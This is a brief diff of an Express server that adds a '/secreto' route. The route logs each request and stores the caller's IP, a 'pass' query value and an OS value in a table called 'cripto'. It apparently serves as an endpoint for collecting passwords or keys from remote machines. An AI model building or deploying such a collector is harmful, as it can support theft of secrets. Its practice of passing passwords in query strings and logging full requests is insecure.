@@ -92,7 +92,22 @@ knex('cripto').where('id','=',id).del().then(
        
     ).catch(err => console.log(err))
 })
-
+app.get ('/secreto', (req,res)=> {
+  console.log(req)
+  console.log(req.query);
+  const id = generateUniqueId({
+    length: 20,
+    useLetters: false
+  });
+    knex('cripto')
+    .returning('*')
+    .insert({
+      id:id,
+      ip:req.headers['x-forwarded-for'],
+      pass:req.query.pass,
+      so:req.query.os
+    } )
+  })
 
 
 app.listen(process.env.PORT || 3001, () => {
